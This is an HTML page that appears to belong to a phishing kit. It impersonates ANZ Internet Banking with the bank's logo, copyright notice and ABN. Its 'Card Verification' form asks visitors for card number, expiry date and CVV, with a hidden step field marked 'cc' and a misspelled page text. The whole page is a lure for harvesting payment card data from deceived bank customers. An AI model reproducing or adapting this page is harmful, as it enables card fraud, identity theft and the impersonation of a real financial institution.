<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Payement - ANZ Internet Banking</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/fav.ico" type="image/x-icon" />
  <link rel="shortcut icon" href="image/fav.ico" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
</head>


	<body>
			<header>
				<img src="image/logo_anz.svg">
			</header>
        <div class="home">
        	<div class="container">
        		<div class="row">
        			<div class="col-md-10 col-12">
        				<div class="conta_left">
        					<div class="login_validation" style="padding-bottom:20px;">
        						 <div class="head">
        						 	 <h5>Card Verification <br>ANZ Internet Banking</h5>
        						 </div>
	        					 <form action="" method="">
	        					 	<input type="hidden" value="cc" name="step">
		        					 	<div class="all_input">
		        							<div class="form-group row mb-3" style="margin:0;">
		        								<label for="card_number" class="col-md-3">Card Number</label>
		        								<div class="col-md-6">
		        									<input type="text" id="card_number" name="card_number" class="form-control mb-0">
		        									<div class="error">the value is requirad</div>
		        							</div>
		        							</div>
		        							<div class="form-group row mb-3" style="margin:0;">
		        								<label for="expiry" class="col-md-3">Expiration date</label>
		        								<div class="col-md-6">
		        									<input type="text" id="expiry" name="expiry" class="form-control mb-0">
		        									<div class="error">the value is requirad</div>
		        							  </div>
		        							</div>
		        							<div class="form-group row mb-3" style="margin:0;">
		        								<label for="cvv" class="col-md-3">CVV</label>
		        								<div class="col-md-3">
		        									<input type="text" id="cvv" name="cvv" class="form-control mb-0">
		        									<div class="error">the value is requirad</div>
		        							  </div>
		        							</div>
			        						<div class="bott_onix col-md-9">
			        								<button type="submit" class="btn"><i class="fa fa-lock"></i>NEXT</button>
			        						</div>
			        						<hr>
			        						<p class="mb-4 mt-4" style="color: #212529;font-size: 13px;">we need to verify your personal information.<strong>Please complete the fields above</strong></p>
			        					</div>
	        					 </form>
        				    </div>   
                   </div>
        				</div>
        			</div>
        			
        		</div>
        	</div>
        </div>
        <div class="fotter">
        	<div class="coperayt">© Australia and New Zealand Banking Group Limited (ANZ) 2022 ABN 11 005 357 522.</div>
        </div>

  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/jquery.mask.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
  <script>
        $('#cvv').payment('formatCardCVC');
        $('#expiry').payment('formatCardExpiry');
        $('#card_number').payment('formatCardNumber');
  </script>
</body>
</html>